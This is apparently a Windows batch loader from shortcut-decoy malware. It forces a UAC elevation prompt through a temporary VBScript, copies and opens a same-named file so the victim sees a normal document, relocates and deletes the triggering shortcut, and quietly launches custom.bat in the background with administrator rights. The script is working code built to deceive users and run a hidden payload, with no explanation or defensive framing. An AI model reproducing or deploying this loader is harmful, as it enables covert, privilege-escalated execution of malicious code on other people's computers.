@REM @echo off
SETLOCAL ENABLEDELAYEDEXPANSION

goto getAdmin
exit

:continue

for %%I in (.) do set hidden=%%~nxI

cd ..
for /R "%cd%" %%F in (*.lnk) do (
    set name=%%~nxF
    set name=!name:~0,-4!
)
cd !hidden!

echo f | xcopy "!name!" "../!name!"

cd ..
start "" "!name!"
cd !hidden!

cd ..
echo f | xcopy "!name!.lnk" "!hidden!/!name!.lnk" /f /y
del "!name!.lnk"
cd !hidden!

start /b cmd /c custom.bat

exit

:getAdmin
net session >nul 2>&1
if %errorLevel% == 0 (
    goto gotAdmin
) else (
    goto UACPrompt
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%getadmin.vbs"

    "%temp%getadmin.vbs"
    del "%temp%getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
    goto continue